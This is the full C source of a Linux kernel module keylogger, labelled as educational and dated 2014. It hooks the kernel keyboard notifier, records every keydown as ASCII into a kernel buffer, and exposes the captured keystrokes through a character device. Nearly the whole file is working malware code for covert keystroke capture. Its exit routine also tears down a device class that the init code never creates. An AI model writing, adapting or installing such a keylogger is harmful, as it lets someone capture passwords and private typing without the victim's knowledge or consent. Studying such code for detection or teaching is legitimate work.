/**
 * Linux keylogger kernel module
 * Copyright (C) 2014 Ng Tzy Luen. All Rights Reserved.
 *
 * Tested under GNU C gcc 4.7.2, linux kernel v3.14.0
 */
#include <linux/module.h>   /* all device module require it, i.e, MODULE_* */
#include <linux/cdev.h>     /* char device stuffs, cdev_[int|add|del], */
#include <linux/raw.h>      /* requird by constants: MAX_RAW_MINORS,MAX_RAW_MINORS... */
#include <linux/input.h>    /* required by class_[create|destroy], device_[create|destroy] */
#include <linux/fs.h>       /* required by file_operations, file, [un]register_chrdev_*, */
#include <linux/slab.h>     /* required by kmalloc, ... it sources linux/types.h */
#include <linux/keyboard.h> /* required by [un[register_keyboard_notifier, KEY_CODES... */
#include <asm/uaccess.h>    /* required by copy_[to|from]_user, put_user... */

#include "apate.h"

MODULE_AUTHOR("TzyLuen Ng <tzyluen.ng@gmail.com>");
MODULE_DESCRIPTION("Educational purpose trivial linux keylogger kernel module");
MODULE_LICENSE("GPL");


static ssize_t dev_read(struct file *filp, char __user *buff, size_t len, loff_t *off)
{
    int bytes = 0;      /* store total bytes read */
    /**
     * kernel space - static char buffer[BUFF_LENGTH + 1]
     * user space   - char __user *buff
     * alternative to put_user:
     *
     * unsigned long copy_to_user (void __user * to, const void * from, unsigned long n);
     */
    while (buffer[read_pos] != '\0') {          /* read from kernel space `buffer' into */
        put_user(buffer[read_pos++], buff++);   /* + user space `buff' */
        ++bytes;                                /* increase bytes read count */
    }

    printk(KERN_DEBUG "%s:%d: bytes: %d", __FILE__, __LINE__,  bytes);
    printk(KERN_DEBUG "%s:%d: read_pos: %d", __FILE__, __LINE__, read_pos);

    return bytes;
}


static int apate_init(void)
{
    /**
     * step 1:
     * create a dev_t type with major/minor and register it
     */
    int ret;            /* return value; multi purpose within this block */
    if (DEV_MAJOR) {    /* if DEV_MAJOR defined */
        dev = MKDEV(DEV_MAJOR, DEV_MINOR);  /* turn (DEV_MAJOR, DEV_MINOR) into dev_t type */
        /* register a range of char device numbers: dev's major .. MAX_RAW_MINORS
         * 0 on success; negative error code on failure
         */
        ret = register_chrdev_region(dev, MAX_RAW_MINORS, THIS_MODULE->name);
        if (ret) 
            goto error;
    } else {            /* if DEV_MAJOR isn't set, allocate dynamically instead */
        /* register a range of char device numbers:
         * int alloc_chrdev_region(dev_t * dev, unsigned baseminor, unsigned count, const char * name);
         */
        ret = alloc_chrdev_region(&dev, DEV_MINOR, MAX_RAW_MINORS, THIS_MODULE->name);
        dev_major = MAJOR(dev);     /* get the device major number */
    }

    /**
     * step 2:
     * register the character device
     */
    cdev_init(&apate_cdev, &fops);  /* initialize the cdev's apate_cdev struct, and assign the &fops. */
    ret = cdev_add(&apate_cdev, dev, MAX_RAW_MINORS); /* add the device into the system */
    if (ret)    /* 0 on success; negative error code on failure */
        goto error_region;
    /* as soon as cdev_add returns, the device goes live */

    /**
     * create the device and registers it with sysfs.
     * device_create expecting a struct class previously created with class_create.
     */
    // class not needed; unless we have multiple devices of same type
    //apate_class = class_create(THIS_MODULE, THIS_MODULE->name);
    //if (IS_ERR(apate_class)) {  /* if apate_class pointer is valid; non-0 is error; 0 is success */
    //    printk(KERN_ERR "-E- Error creating apate class.");
    //    cdev_del(&apate_cdev);            /* remove and freeing apate_cdev address */
    //    ret = PTR_ERR(apate_class);       /* retrieves the error number from the pointer */
    //    printk(KERN_ERR "-E- %d", ret);   /* print the string describing error number */
    //    goto error_region;
    //}
    //
    //device_create(apate_class, NULL, dev, NULL, DEV_NAME);

    /**
     * step 3:
     */
    register_keyboard_notifier(&nb);        /* register keyboard events */
    memset(buffer, 0, sizeof buffer);       /* fill the buffer with 0 */
    printk(KERN_INFO "%s registered: %d, %d, %d\n",
            THIS_MODULE->name, DEV_MAJOR, DEV_MINOR, MAX_RAW_MINORS);
    printk(KERN_INFO "%s loaded\n", THIS_MODULE->name);

    //proc_dir_entry *pde = create_proc_read_entry(DEV_NAME, 0, NULL );

    return 0;

error_region:
    unregister_chrdev_region(dev, MAX_RAW_MINORS);  /* unregister dev */
error:
    unregister_keyboard_notifier(&nb);      /* unregister the keyboard events */
    return ret;
}


static void apate_exit(void)
{
    /* unregisters and cleans up this device's resources */
    device_destroy(apate_class, MKDEV(DEV_MAJOR, 0));   /* remove; created with device_create */
    class_destroy(apate_class);                         /* remove; created with class_create */
    cdev_del(&apate_cdev);   /* remove apate_cdev from the system, free the structure itself */
    unregister_chrdev_region(MKDEV(DEV_MAJOR, 0),  /* unregister the range of allocated device numbers */
        MAX_RAW_MINORS);

    unregister_keyboard_notifier(&nb);      /* unregister the keyboard events */
    memset(buffer, 0, sizeof buffer);       /* fill the buffer with 0 */
    bptr = buffer;                          /* point `buffer' to `bptr' */
    printk(KERN_INFO "%s unloaded\n", THIS_MODULE->name);
}


/**
 * the keyboard event listener:
 */
static int kbd_notifier(struct notifier_block *nblock, unsigned long code, void* _param)
{
    struct keyboard_notifier_param *param = _param;

    if (read_pos >= BUFF_LENGTH) {          /* if read position exceeded allocated buffer size, */
        read_pos = 0;                       /* reset the read position to 0 */
        memset(buffer, 0, sizeof buffer);   /* reset the buffer with 0 */
        bptr = buffer;                      /* move bptr pointer cursor to the head of buffer */
    }

    if (code == KBD_KEYCODE && param->down) { /* valid KBD_KEYCODE & is a keydown */
        if (param->value == KEY_BACKSPACE) {  /* if key is backspace */
            if (bptr != buffer) {             /* if bptr isn't pointing to head of the buffer */
                --bptr;                       /* move bptr pointer cursor backward(backspace) */
                *bptr = '\0';                 /* and end it with null char */
            }
        } else {                              /* key is not a space */
            char ch = get_ascii(param->value);/* get the correspondence ascii code */
            if (ch != 'Z') {                  /* if ch != excluded keys ('Z') in char_table[] */ 
                *bptr = ch;                   /* denote bptr, and add ch into it */
                bptr++;                       /* advance the bptr memory index */
                if (bptr == endptr)           /* if bptr pointer cursor reached endptr */
                    bptr = buffer;            /* move bptr pointer cursor to the head of buffer */
            }
        }
    }

    return NOTIFY_OK;   /* notification was processed correctly, [DONE|BAD|STOP|STOP_MASK] */
}


/* return the corresponding ascii for keycode - c */
static inline char get_ascii(int c)
{
    if ((c < KEY_ESC || c > KEY_SLASH) && c != KEY_SPACE)   /* keycode is not between ESC and SLASH */
        return 'Z';                                         /* return 'Z'; the ignored key symbol */
    else if (c == KEY_SPACE)                                /* if keycode is SPACE */
        return ' ';                                         /* return SPACE */
    return char_table[c - KEY_ESC];                         /* retrieve the ascii code from table */
}


module_init(apate_init);    /* driver initialization entry point */
module_exit(apate_exit);    /* driver exit entry point */
